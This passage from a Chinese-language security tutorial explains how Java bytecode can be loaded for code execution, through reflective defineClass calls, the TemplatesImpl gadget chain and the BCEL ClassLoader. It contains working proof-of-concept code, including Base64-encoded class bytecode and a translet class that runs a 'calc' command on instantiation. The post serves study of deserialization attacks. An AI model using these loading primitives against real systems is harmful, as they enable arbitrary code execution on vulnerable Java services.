e.printStackTrace(); } } public static byte[] readFileToByteArray(String filePath) throws Exception { return Files.readAllBytes(Paths.get(filePath)); } public static String encodeBase64(byte[] data) { return Base64.getEncoder().encodeToString(data); } } //也可以javac编译，然后cat输出是Base64编码一下，就是需要注意idea和javac运行的JDK版本要相同。 再使用base64解码就可以得到完整的字节码了，如下：\n1 byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAKgoACAAbCgAcAB0IAB4KABwAHwcAIAoABQAhBwAiBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAAg8Y2xpbml0PgEAAXgBABNMamF2YS9sYW5nL1J1bnRpbWU7AQABeQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAgAQAKU291cmNlRmlsZQEACVRlc3QuamF2YQwACQAKBwAkDAAlACYBAARjYWxjDAAnACgBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAApAAoBAARUZXN0AQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAIAAQAJAAoAAQALAAAALwABAAEAAAAFKrcAAbEAAAACAAwAAAAGAAEAAAAEAA0AAAAMAAEAAAAFAA4ADwAAAAgAEAAKAAEACwAAAIEAAgACAAAAFrgAAksSA0wqK7YABFenAAhLKrYABrEAAQAAAA0AEAAFAAMADAAAAB4ABwAAAAcABAAIAAcACQANAAwAEAAKABEACwAVAA0ADQAAACAAAwAEAAkAEQASAAAABwAGABMAFAABABEABAAVABYAAAAXAAAABwACUAcAGAQAAQAZAAAAAgAa\u0026#34;); 加载字节码成Class对象，然后实例化拿到一个对象\n1 2 3 Class Test = (Class)method.invoke(ClassLoader.getSystemClassLoader(), \u0026#34;Test\u0026#34;, code, 0, code.length); Test.newInstance(); //ClassLoader.getSystemClassLoader()返回系统的类加载器对象 这里是因为defineClass()方法是一个实例方法。所以可以需要用一个实例对象即可，所以最终如下输出：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package java_foundation; import java.lang.ClassLoader; import java.util.Base64; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception{ byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAMQoACgAZCgAaABsIABwKABoAHQcAHgkAHwAgCAAhCgAiACMHACQHACUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABkxUZXh0OwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAB4BAApTb3VyY2VGaWxlAQAJVGV4dC5qYXZhDAALAAwHACYMACcAKAEABGNhbGMMACkAKgEAE2phdmEvbGFuZy9FeGNlcHRpb24HACsMACwALQEADOW8guW4uOmAgOWHugcALgwALwAwAQAEVGV4dAEAEGphdmEvbGFuZy9PYmplY3QBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEACQAKAAAAAAACAAEACwAMAAEADQAAAC8AAQABAAAABSq3AAGxAAAAAgAOAAAABgABAAAAAwAPAAAADAABAAAABQAQABEAAAAIABIADAABAA0AAABlAAIAAQAAABa4AAISA7YABFenAAxLsgAGEge2AAixAAEAAAAJAAwABQADAA4AAAAWAAUAAAAGAAkACQAMAAcADQAIABUACgAPAAAADAABAA0ACAATABQAAAAVAAAABwACTAcAFggAAQAXAAAAAgAY\u0026#34;); Method method = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;,String.class,byte[].class,int.class,int.class); method.setAccessible(true); Class clazz = (Class)method.invoke(ClassLoader.getSystemClassLoader(),\u0026#34;Text\u0026#34;,code,0,code.length); clazz.newInstance(); } } 成功弹出计算机。\n使用javac目录的话就需要注意JDK的版本问题，需要一致。\n在前面的POC中调用方法时是用的AppClassLoader实例，也是才知道原来这里返回的ClassLoader是一个实例，那么这里为什么这样用呢。大概想一下就可以知道，由于defineClass()方法是一个普通方法，所以当调用invoke()方法时需要一个实例，即需要一个ClassLoader的实例来调用它。这里就是用AppClassLoader类加载器来加载Text类，大概就是这个意思。\n————————\n同样的可以直接利用IO进行文件读取，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package java_foundation; import java.lang.ClassLoader; import java.lang.reflect.Method; import java.nio.file.Files; import java.nio.file.Paths; public class Main { public static void main(String[] args) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Text.class\u0026#34;)); Method method = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;,String.class,byte[].class,int.class,int.class); method.setAccessible(true); Class clazz = (Class)method.invoke(ClassLoader.getSystemClassLoader(),\u0026#34;Text\u0026#34;,code,0,code.length); clazz.newInstance(); } } 同时要想到这里既然可以利用defineClass()方法直接加载字节码，那么我们在自定义类加载器的时候也要想到这一点，也许就可以直接利用。\n在defineClass被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行，而且即使我们将初始化代码放在类的static块中，在defineClass时也无法被直接调用到。所以，如果我们想要使用defineClass在目标机器上执行任意代码，需要想办法调用构造函数。\n一定要注意的是：由于系统的ClassLoader#defineClass是一个保护属性，所以我们不能直接在外部访问，必须使用反射的形式来调用。\n在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链TemplateImpl的基石\n利用TemplatesImpl加载字节码 虽然大部分上层开发者不会直接使用到defineClass方法，但是Java底层还是有一些类用到了它，这就是TemplatesImpl。\ncom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl这个类中定义了一个内部类TransletClassLoader，源代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 static final class TransletClassLoader extends ClassLoader { private final Map\u0026lt;String,Class\u0026gt; _loadedExternalExtensionFunctions; TransletClassLoader(ClassLoader parent) { super(parent); _loadedExternalExtensionFunctions = null; } TransletClassLoader(ClassLoader parent,Map\u0026lt;String, Class\u0026gt; mapEF) { super(parent); _loadedExternalExtensionFunctions = mapEF; } public Class\u0026lt;?\u0026gt; loadClass(String name) throws ClassNotFoundException { Class\u0026lt;?\u0026gt; ret = null; if (_loadedExternalExtensionFunctions != null) { ret = _loadedExternalExtensionFunctions.get(name); } if (ret == null) { ret = super.loadClass(name); } return ret; } Class defineClass(final byte[] b) { return defineClass(null, b, 0, b.length); } } 这个类继承自ClassLoader类，并且重写了defineClass方法，是一个静态类，并且这里没有显示地声明其定义域，那么它的作用域就是default，可以被类外部调用。\n注意看它的defineClass()方法，和前面说的利用的defineClass调用的方法是一样的，这里可以尝试调用，但是这里是只传入了byte，应该也是可以利用的，本来这个重点应该就是字节码。\n那么现在从 TransletClassLoader#defineClass() 向前追溯一下调用链：\n1 2 3 TemplatesImpl#getOutputProperties() -\u0026gt; TemplatesImpl#newTransformer() -\u0026gt; TemplatesImpl#getTransletInstance() -\u0026gt; TemplatesImpl#defineTransletClasses() -\u0026gt; TransletClassLoader#defineClass() 那现在来跟一下这个调用链，从后往前。\n我们看TemplatesImpl#defineTransletClasses()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 private void defineTransletClasses() throws TransformerConfigurationException { if (_bytecodes == null) {//注意这里 ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount \u0026gt; 1) { _auxClasses = new HashMap\u0026lt;\u0026gt;(); } for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } catch (ClassFormatError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (LinkageError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } 几个比较关键的代码：\n1 2 3 4 5 6 7 8 9 10 11 TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); +++++++ for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); 可以看到这里是调用了TransletClassLoader类的defineClass()方法，这里不就正好对应前面调用的方法了吗。\n然后看其他点：\n首先需要_bytecodes不等于null\n以及在这个TemplatesImpl类中的属性：\n否则是无法进行后面几步的。\n但是在TemplatesImpl类中，这个变量的定义如下：\n1 private byte[][] _bytecodes = null; 这里的_bytecodes定义为私有的并且没有其他方法可以直接修改它，在这里可以利用反射获取并修改那个变量。\n还有的其他需要注意的点，defineTransletClasses方法中会执行一个run方法：\n也就是之前说的实例化TransletClassLoader类的代码。这里为了防止报错所以_tfactory不能为空，来看一下TemplatesImple类中的_tfactory的初值：\n1 private transient TransformerFactoryImpl _tfactory = null; 可以看出来这里的变量_tfactory需要是一个TranformerFactoryImpl类型的数据，并且在run方法中要执行的就是_tfactory变量的方法。所以这里直接将这个_tfactory变量赋值为TransformerFactoryImpl类实例即可。\n现在继续看哪里使用过这个defineTransletClasses()方法，搜索一下，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 //第一个： private synchronized Class[] getTransletClasses() { try { if (_class == null) defineTransletClasses(); } catch (TransformerConfigurationException e) { // Falls through } return _class; } //第二个： public synchronized int getTransletIndex() { try { if (_class == null) defineTransletClasses(); } catch (TransformerConfigurationException e) { // Falls through } return _transletIndex; } //第三个(部分代码)： private Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null; if (_class == null) defineTransletClasses(); AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); ............... return translet; } catch (TransformerConfigurationException e) { // Falls through } } 第一个方法为私有，往上调用，没有什么方法使用过，那么就只有放弃。\n第二个方法为public，可以直接调用，但是有限制，后面会说。\n第三个方法向上调用发现有一个方法调用了，并且是一个public方法，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer; } 那么现在的思路就是实例化TemplatesImpl对象后直接调用它的方法就能直接使用。\n现在来看看使用的条件是什么，\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 对于第三个： （1）在newTransformer()方法中： TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory);//进入下一个方法并不需要条件继续，这里就直接诶调用get （2）在 getTransletInstance()方法中： if (_name == null) return null; if (_class == null) defineTransletClasses(); //这里要求_name不能为null，_class需要为null然后继续跟进 （3）在 defineTransletClasses() 方法中 if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); }//_bytecodes不能为null TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());//_tfactory需要赋值为TransformerFactoryImpl对象 } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount \u0026gt; 1) { _auxClasses = new HashMap\u0026lt;\u0026gt;(); } for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); //在这里调用了defineClass方法 final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } 现在来总结一下上面遇到的变量\n1 2 3 4 private String _name = null; private Class[] _class = null; private byte[][] _bytecodes = null; private transient TransformerFactoryImpl _tfactory = null; 这里可以看到这些变量都是私有类，而且没有构造方法，所以只能用反射获取改值。所以最终可以这样构造:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package java_foundation; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; public class Main { public static void main(String[] args) throws Exception { byte[] bytecodes = Base64.getDecoder().decode(\u0026#34;xxxx\u0026#34;); TemplatesImpl mpl =new TemplatesImpl(); setFieldValue(mpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(mpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{bytecodes}); setFieldValue(mpl,\u0026#34;_class\u0026#34;,null); setFieldValue(mpl,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); mpl.newTransformer(); } public static void setFieldValue(Object mpl,String name,Object value) throws Exception { Field field = mpl.getClass().getDeclaredField(name); field.setAccessible(true); field.set(mpl,value); } } 但是现在又遇到一个问题，就算成功加载了Class对象，这里并不能直接调用构造函数，即没有初始化，这样并不能利用我们自己构造的代码，那么该如何解决，继续看代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 private Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) { translet.setAuxiliaryClasses(_auxClasses); } return translet; } 可以看到代码后半部分实例化了一个对象给translet，并且最后返回的也是translet，所以还是这里的newInstance()有用（重点，就是利用这个构造方法来实例化对象时来利用，这也是为什么将恶意代码设置在构造方法中），所以要确保进入defineTransletClasses()并不会报错，现在继续来看defineTransletClasses()方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 private void defineTransletClasses() throws TransformerConfigurationException { if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount \u0026gt; 1) { _auxClasses = new HashMap\u0026lt;\u0026gt;(); } for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) {//这里要求_transletIndex不能小于0 ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } 在这个代码中，虽然我们在前面为了符合条件将_class赋值为了null，但是在defineTransletClasses()方法中重新对这个_class赋值了：\n这里不多说。后面就懂了。然后看下面这部分代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) {//这里要求_transletIndex不能小于0 ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } 这里_transletIndex不能小于0，并且在前面可以看到赋值语句：\n1 _transletIndex = i; 这里刚好与前面的_class[_transletIndex]相对应，并且什么，前面的代码逻辑也完全符合，如下：\n也就是说先调用了defineTransletClasses()方法，让_class不再为null，所以可以有值。\n也就是可以理解为只要条件满足，_bytecodes对应的代码都会传给_class[i]，也就是_class[_transletIndex],然后就会再对这个类进行实例化，这样就可以成功运行。现在来看给这个赋值的if的条件语句，如下：\n1 2 3 4 5 6 if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } 再看 _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); 所以这里就需要_bytecodes[i]的父类需要为AbstractTranslet才行\n1 2 private static String ABSTRACT_TRANSLET = \u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;; 所以使用的POC:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 这里为什么要多两个transform方法，原因如下;\n1 2 3 4 5 这里是因为子类需要实现父类里面的抽象方法，同时因为父类是抽象类，可能没有将接口的方法全部实现， 这时子类如果不是抽象的，那必须将其他接口方法都实现。 这里面 transform(DOM document, DTMAxisIterator iterator,SerializationHandler handler) 是父类里面的抽象方法所以要重写 transform(DOM document, SerializationHandler[] handlers)是父类没有实现接口的方法所以要重写 最终的POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package java_foundation; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; public class Main { public static void main(String[] args) throws Exception { byte[] bytecodes = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAWTGphdmFfZm91bmRhdGlvbi9UZXh0OwEACkV4Y2VwdGlvbnMHACUBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAmAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJVGV4dC5qYXZhDAAHAAgHACcMACgAKQEABGNhbGMMACoAKwEAFGphdmFfZm91bmRhdGlvbi9UZXh0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAACgAEAAsADQAMAAsAAAAMAAEAAAAOAAwADQAAAA4AAAAEAAEADwABABAAEQACAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAADwALAAAAIAADAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABQAFQACAA4AAAAEAAEAFgABABAAFwACAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAEgALAAAAKgAEAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABgAGQACAAAAAQAaABsAAwAOAAAABAABABYAAQAcAAAAAgAd\u0026#34;); TemplatesImpl mpl =new TemplatesImpl(); setFieldValue(mpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(mpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{bytecodes}); setFieldValue(mpl,\u0026#34;_class\u0026#34;,null); setFieldValue(mpl,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); mpl.newTransformer(); } public static void setFieldValue(Object mpl,String name,Object value) throws Exception { Field field = mpl.getClass().getDeclaredField(name); field.setAccessible(true); field.set(mpl,value); } } 虽然报错，但是成功弹出计算机：\n报错是正常的，因为本来构造出来的动态加载字节码就会导致原有逻辑被破坏，所以是肯定会报错的。但达到了最终目的。\n那么现在我们来尝试一下利用那个public修饰符的方法，即getTransletIndex，代码如下：\n1 2 3 4 5 6 7 8 9 public synchronized int getTransletIndex() { try { if (_class == null) defineTransletClasses(); } catch (TransformerConfigurationException e) { // Falls through } return _transletIndex; } 这里也是只需要_class变量为null即可，现在就继续跟defineTransletClasses()，但是这里就有个问题，无法实例化，这也是为什么没有利用到这个的原因。\n继续思考，是私有方法，为什么不直接使用反射来获取，因为TemplatesImpl类有一个无参的公共的构造方法，尝试构造一下\n弹计算机代码不变，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Text extends AbstractTranslet { public Text() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.java变为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 //对象+getClass() package java_foundation; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\java_foundation\\\\Text.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); Method method = ctf.getClass().getDeclaredMethod(\u0026#34;getTransletInstance\u0026#34;); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); method.setAccessible(true); method.invoke(ctf);//但是其实在根本上没有变化，都是在getTransletInstance方法这里实例化，没办法，只有这里接收到了defineClass()返回的类，这里才能实例化 } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 其他就不多说了。\n利用BCEL ClassLoader加载字节码 关于BCEL可以先看看P神的文章：https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html#0x01-bcel\n在Java 8u251的更新中，这个ClassLoader被移除了，简单了解一下。这里用JDK7看一下\n——————————————\nBCEL全名是Apache Commoms BCEL，属于Apache Commoms项目下的一个子项目。\nBCEL库提供了一系列用于分析、创建、修改Java Class文件的API。它很特殊的点在它被包含在了原生的JDK中，位于com.sun.org.apache.bcel中。\nBCEL包中有个有趣的类com.sun.org.apache.bcel.internal.util.ClassLoader，他是一个ClassLoader，但是他重写了Java内置的ClassLoader#loadClass()方法，去看一下源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 protected Class loadClass(String class_name, boolean resolve) throws ClassNotFoundException { Class cl = null; /* First try: lookup hash table. */ if((cl=(Class)classes.get(class_name)) == null) { /* Second try: Load system class using system class loader. You better * don\u0026#39;t mess around with them. */ for(int i=0; i \u0026lt; ignored_packages.length; i++) { if(class_name.startsWith(ignored_packages[i])) { cl = deferTo.loadClass(class_name); break; } } if(cl == null) { JavaClass clazz = null; /* Third try: Special request? */ if(class_name.indexOf(\u0026#34;$$BCEL$$\u0026#34;) \u0026gt;= 0) clazz = createClass(class_name); else { // Fourth try: Load classes via repository if ((clazz = repository.loadClass(class_name)) != null) { clazz = modifyClass(clazz); } else throw new ClassNotFoundException(class_name); } if(clazz != null) { byte[] bytes = clazz.getBytes(); cl = defineClass(class_name, bytes, 0, bytes.length);//这里调用了defineClass方法 } else // Fourth try: Use default class loader cl = Class.forName(class_name); } if(resolve) resolveClass(cl); } classes.put(class_name, cl); return cl; } 其中调用的是defineClass()方法\n1 2 3 4 if(clazz != null) { byte[] bytes = clazz.getBytes(); cl = defineClass(class_name, bytes, 0, bytes.length);//这里调用了defineClass方法 } 看代码，这里就需要需要BCEL字节码的开头为$$BCEL$$，用createClass方法获取类的Class对象从而可以赋值给clazz。\n1 2 if(class_name.indexOf(\u0026#34;$$BCEL$$\u0026#34;) \u0026gt;= 0) clazz = createClass(class_name); 